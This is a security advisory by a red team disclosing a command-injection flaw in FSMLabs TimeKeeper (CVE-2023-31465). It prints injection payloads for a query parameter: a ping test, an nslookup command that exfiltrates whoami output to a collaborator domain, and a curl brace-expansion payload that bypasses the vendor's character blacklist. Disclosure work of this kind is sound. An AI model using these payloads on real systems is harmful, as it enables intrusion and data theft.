# CVE-2023-31465 | TimeKeeper by FSMLabs - RCE
During a PT activity, we managed to find a Remote Command Execution vulnerability in TimeKeeper and, while fixing it, we had the opportunity to modify and evolve the payload.
In the first paragraph we are going to explain the discovery and exploitation of the vulnerability, and this was performed during the time of the penetration testing, while in the second paragraph 
we will show the fix attempts, the re-exploitation and the final countermeasure.


## TimeKeeper version 2.0.17

In the image below is represented the request that is employed by TimeKeeper in order to set the source of IPs that has to be synchronized.

![req](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/f6e13bf7-2755-40f4-8d8c-09cf66116815)

During our first analysis, we used some Windows and Linux concatenation strings with the **ping** command to check a potential RCE vulnerability. 
We first discovered it in the *arg2* query parameter, with the following payload appended to the **earliest** number value:

```
||ping -c 10 127.0.0.1
```

A time delay was triggered, so we kept testing with other techniques and payloads.

After some time, we uncovered the following payload, useful for retrieving hex-encoded information (the data has been hex-encoded with *xxd* in order to avoid cutting off due to the DNS protocol):

```
||nslookup $(xxd -pu <<< $(whoami)).OASTIFY.DOMAIN||x
```

Below you can observe, respectively:
* the malicious request;

![poc1](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/1a99f5a7-939a-4bfd-aab9-f9226e0d3351)

* the burp collaborator DNS interactions with hex-data exfiltrated;

![poc2](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/265b70a5-a80c-4dea-9143-5663f9aab18b)
 
* the hex-decoded values for the **whoami** and **id** commands.

![poc3](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/61f12806-36ba-46b7-b0d0-c928e0b7275d)


## TimeKeeper version 2.0.28 (BETA)

After discovering the vulnerability, we contacted directly FSMLabs to notify about the critical vulnerability.
They thanked and asked us to conduct more tests on the BETA version to ensure that the vulnerability has been fixed in the meanwhile, as version 2.0.17 was over 2 years old at the time of testing 
(2023).

A blacklist was implemented for some characters, such as: |, &, *, $, <, >, (, ), -. The previous payload, then, could not be used anymore. However, curly brackets were not
blacklisted, so we tried with the *bash expansion* technique.

Specifically, the following payload was injected:

```
;{curl,`whoami`.[collaborator_domain]};a
```

and we were still able to conduct a remote command execution.


## Remediation

The FSMLabs has fixed the vulnerability in TimeKeeper version 2.0.28.


## Vulnerable version of TimeKeeper

As a result of our testing, versions 2.0.17 through 2.0.27 are vulnerable to RCE.


## Discovered by

Francesco Iaria

Riccardo Degli Esposti

Claudio Rimensi

Francesco Varotto
